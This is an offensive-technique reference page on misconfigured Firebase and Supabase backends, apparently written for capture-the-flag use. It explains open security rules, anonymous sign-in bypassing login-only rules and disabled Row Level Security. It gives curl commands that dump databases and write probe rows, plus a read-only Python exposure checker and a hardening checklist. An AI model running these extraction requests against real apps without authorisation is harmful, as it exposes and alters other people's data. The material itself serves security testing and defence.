---
title: "BaaS Misconfiguration - Firebase and Supabase Open Rules and Anonymous Access"
category: cloud
subcategory: baas
type: technique
tags: [cloud, firebase, supabase, baas, firestore, realtime-database, security-rules, anonymous-auth, rls, row-level-security, postgrest, api-key, enumeration, open-rules, data-exposure]
difficulty: easy
summary: "Backend-as-a-service exposes the database directly to clients; the only control is server-side rules, and CTF targets ship them wide open."
when_to_use:
  - "A web/mobile app talks to firebaseio.com, firestore.googleapis.com, or a supabase.co host"
  - "You find a Firebase config or a Supabase anon key in JS/APK"
  - "The app allows anonymous sign-in"
  - "The objective is data held in Firestore, Realtime DB, or a Supabase/Postgres table"
tools: [curl, jq, firebase-cli, supabase-cli]
related: [object-storage-misconfig, cloud-metadata-ssrf, serverless-attacks, cloud-enum-script]
---

## TL;DR

Firebase and Supabase put the database on the client side of the trust boundary: the browser talks
to the data store directly, authenticated by a public API/anon key, and the *only* access control is
a set of server-side rules (Firebase Security Rules) or Postgres Row Level Security (Supabase). When
those rules are permissive - which CTF targets and many real apps are - anyone with the public key
reads and writes everything.

## Recognise it

- Network requests to `*.firebaseio.com`, `firestore.googleapis.com`, `identitytoolkit.googleapis.com`,
  or `*.supabase.co` / `*.supabase.in`.
- A `firebaseConfig` object in the page source with `apiKey: "AIzaSy..."`, `projectId`, `databaseURL`.
- A Supabase client init with a `SUPABASE_URL` and a long `anon` JWT key.
- The API key `AIzaSy...` - this is a Firebase *identifier*, not a secret; it is meant to be public.
- Anonymous auth working (an app that "just works" without login).

## Theory

### Firebase: the key is public, the rules are everything

The `apiKey` in a Firebase config is a project identifier, not a credential - Google's docs say it
is safe to expose. Access control lives entirely in **Security Rules**, evaluated server-side for
Firestore, Realtime Database and Storage. The catastrophic default some apps ship:

```
// Realtime Database -- world read/write
{ "rules": { ".read": true, ".write": true } }

// Firestore -- world read/write
service cloud.firestore {
  match /databases/{db}/documents {
    match /{document=**} { allow read, write: if true; }
  }
}
```

Even without open rules, `allow read: if request.auth != null` is bypassed by **anonymous auth**:
`identitytoolkit.googleapis.com/v1/accounts:signUp?key=APIKEY` mints an anonymous user, giving you
`request.auth != null`. Many apps enable anonymous sign-in without realising it satisfies their
"logged-in users only" rule.

Realtime Database is especially exposed: appending `.json` to the database URL returns the data over
plain REST if `.read` is true - `https://PROJECT.firebaseio.com/.json` dumps the whole tree.

### Supabase: PostgREST plus Row Level Security

Supabase exposes Postgres through PostgREST at `https://PROJECT.supabase.co/rest/v1/`. The `anon` key
is a public JWT with the `anon` role. Access is governed by **Row Level Security** policies on each
table:

- RLS **disabled** on a table -> the `anon` key reads and writes every row via
  `/rest/v1/<table>?select=*`.
- RLS enabled but with a permissive policy (`USING (true)`) -> same effect.
- The `service_role` key (if ever leaked into client code) bypasses RLS entirely - a full compromise.

Supabase also exposes Auth (`/auth/v1/`), Storage (`/storage/v1/`), and Realtime, each with its own
policy surface.

## Procedure

### Firebase Realtime Database

```bash
DB=https://project-id-default-rtdb.firebaseio.com
# whole tree, if .read is true
curl -s "$DB/.json" | jq .
# a specific path
curl -s "$DB/users.json" | jq .
# shallow key listing (does not require reading values)
curl -s "$DB/.json?shallow=true" | jq .
# test write (non-destructive: a uniquely named probe node)
curl -s -X PUT "$DB/probe_$RANDOM.json" -d '"probe"'
```

### Firebase anonymous auth then Firestore

```bash
KEY=AIzaSy...
# mint an anonymous user
RESP=$(curl -s -X POST \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$KEY" \
  -H 'Content-Type: application/json' -d '{"returnSecureToken":true}')
IDTOKEN=$(echo "$RESP" | jq -r .idToken)

# read a Firestore collection with the anonymous token
PROJECT=project-id
curl -s -H "Authorization: Bearer $IDTOKEN" \
  "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents/COLLECTION"
# unauthenticated read (works if rules allow it)
curl -s "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents/COLLECTION"
```

### Supabase

```bash
URL=https://project.supabase.co
ANON=eyJ...        # the public anon key
# list rows from a table (works if RLS is off or permissive)
curl -s "$URL/rest/v1/TABLE?select=*" -H "apikey: $ANON" -H "Authorization: Bearer $ANON" | jq .
# discover the schema via the OpenAPI root
curl -s "$URL/rest/v1/" -H "apikey: $ANON" | jq 'keys'
# filter / order (PostgREST syntax)
curl -s "$URL/rest/v1/TABLE?select=id,secret&order=id.desc&limit=5" \
  -H "apikey: $ANON" -H "Authorization: Bearer $ANON"
# test insert (non-destructive probe row)
curl -s -X POST "$URL/rest/v1/TABLE" -H "apikey: $ANON" -H "Authorization: Bearer $ANON" \
  -H 'Content-Type: application/json' -d '{"note":"probe"}'
```

## Code - a read-only BaaS exposure checker

```python
#!/usr/bin/env python3
"""Check Firebase / Supabase exposure, read-only.

- Firebase Realtime DB: tests whether /.json is world-readable.
- Firestore: tests unauthenticated collection reads.
- Supabase: tests anon-key table reads and lists the exposed schema.

It performs GETs only (plus an optional anonymous signUp to demonstrate that
request.auth != null rules are bypassable). No writes.

Python 3.11+, standard library only. Usage:
    python3 baas_check.py rtdb   https://PROJECT.firebaseio.com
    python3 baas_check.py fs     PROJECT_ID COLLECTION
    python3 baas_check.py supa   https://PROJECT.supabase.co ANON_KEY [TABLE]
    python3 baas_check.py --self-test
"""
from __future__ import annotations

import json
import sys
import urllib.error
import urllib.request

TIMEOUT = 8


def get(url: str, headers: dict | None = None) -> tuple[int, str]:
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return r.status, r.read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(4096).decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)


def summarize_json(body: str, limit: int = 20) -> str:
    try:
        data = json.loads(body)
    except Exception:
        return f"{len(body)} bytes (non-JSON)"
    if isinstance(data, dict):
        keys = list(data.keys())
        return f"object with {len(keys)} top-level key(s): {keys[:limit]}"
    if isinstance(data, list):
        return f"array of {len(data)} item(s)"
    return repr(data)[:100]


def check_rtdb(db_url: str) -> None:
    db_url = db_url.rstrip("/")
    print(f"=== Firebase Realtime DB: {db_url} ===")
    code, body = get(f"{db_url}/.json?shallow=true")
    print(f"  GET /.json?shallow=true -> HTTP {code}")
    if code == 200:
        print(f"    WORLD-READABLE (.read: true): {summarize_json(body)}")
    elif code == 401:
        print("    permission denied (.read requires auth)")
    else:
        print(f"    {body[:150]}")


def check_firestore(project: str, collection: str) -> None:
    print(f"=== Firestore: {project} / {collection} ===")
    url = (f"https://firestore.googleapis.com/v1/projects/{project}"
           f"/databases/(default)/documents/{collection}")
    code, body = get(url)
    print(f"  unauthenticated GET -> HTTP {code}")
    if code == 200:
        try:
            docs = json.loads(body).get("documents", [])
            print(f"    WORLD-READABLE: {len(docs)} document(s)")
        except Exception:
            print(f"    200 but unparsed: {body[:150]}")
    elif code in (401, 403):
        print("    read requires auth; try anonymous signUp with the project's API key")


def check_supabase(url: str, anon: str, table: str | None) -> None:
    url = url.rstrip("/")
    print(f"=== Supabase: {url} ===")
    headers = {"apikey": anon, "Authorization": f"Bearer {anon}"}
    code, body = get(f"{url}/rest/v1/", headers)
    print(f"  GET /rest/v1/ (schema) -> HTTP {code}")
    if code == 200:
        try:
            paths = list(json.loads(body).get("paths", {}).keys())
            tables = [p.strip("/") for p in paths if p not in ("/", "/rpc")]
            print(f"    exposed endpoints: {tables[:30]}")
        except Exception:
            print(f"    {summarize_json(body)}")
    if table:
        code, body = get(f"{url}/rest/v1/{table}?select=*&limit=5", headers)
        print(f"  GET /rest/v1/{table} -> HTTP {code}")
        if code == 200:
            print(f"    ANON-READABLE (RLS off or permissive): {summarize_json(body)}")
        elif code in (401, 403):
            print("    RLS blocks anonymous read (as intended)")


def main(argv: list[str]) -> int:
    if not argv:
        print(__doc__)
        return 1
    mode = argv[0]
    if mode == "rtdb" and len(argv) >= 2:
        check_rtdb(argv[1])
    elif mode == "fs" and len(argv) >= 3:
        check_firestore(argv[1], argv[2])
    elif mode == "supa" and len(argv) >= 3:
        check_supabase(argv[1], argv[2], argv[3] if len(argv) > 3 else None)
    else:
        print(__doc__)
        return 1
    return 0


if __name__ == "__main__":
    if "--self-test" in sys.argv:
        assert "2 top-level" in summarize_json('{"a":1,"b":2}')
        assert "array of 3" in summarize_json("[1,2,3]")
        assert "non-JSON" in summarize_json("<html>")
        print("[+] self-test ok")
        sys.exit(0)
    sys.exit(main(sys.argv[1:]))
```

## Variants & pitfalls

- **The Firebase API key is not a secret.** Do not treat finding it as the vulnerability; the
  vulnerability is the rules. Google documents that the key is safe to publish.
- **Anonymous auth defeats `request.auth != null`.** A rule that "requires login" is bypassed by
  `accounts:signUp` with `returnSecureToken`. Enabling anonymous auth is the common oversight.
- **Realtime DB `.json` REST** is the fastest dump; add `?shallow=true` to enumerate keys without
  pulling gigabytes.
- **Firestore rules are path-scoped**: a collection may be locked but a subcollection open, or
  reads allowed and writes denied. Test each collection and both verbs.
- **Supabase `service_role` key** in client code is total compromise (bypasses RLS). The `anon` key
  is expected to be public; the question is whether RLS is enabled.
- **RLS off by default on new tables**: a table created without enabling RLS is fully open to the
  anon role. Supabase warns about this in its dashboard.
- **PostgREST filtering** (`?column=eq.value`, `select=`, `order=`, embedded resource expansion) is
  powerful for extracting exactly the target rows and joining across foreign keys.
- **Storage buckets** (Firebase Storage, Supabase Storage) have their own rules - check them too.

## Hardening checklist

- Write least-privilege Security Rules; never ship `allow read, write: if true`.
- Do not rely on `request.auth != null` alone if anonymous auth is enabled; check specific claims or
  disable anonymous sign-in.
- Enable Row Level Security on every Supabase table and write explicit, restrictive policies.
- Never expose the Supabase `service_role` key to clients.
- Scope Firebase Storage rules; validate paths and ownership.
- Use App Check (Firebase) to limit access to your own app instances.

## Tools

- `curl`, `jq` - the whole technique is REST.
- `firebase` CLI (`firebase database:get`), Firestore emulator for rule testing.
- `supabase` CLI, any PostgREST client.
- `Firebase Scanner` / `baserunner`-style tooling for rule enumeration.

## References

- Firebase documentation: "Understand Firebase Security Rules", "Use anonymous authentication",
  "Learn about using and managing API keys for Firebase".
- Supabase documentation: "Row Level Security", "API keys (anon and service_role)".
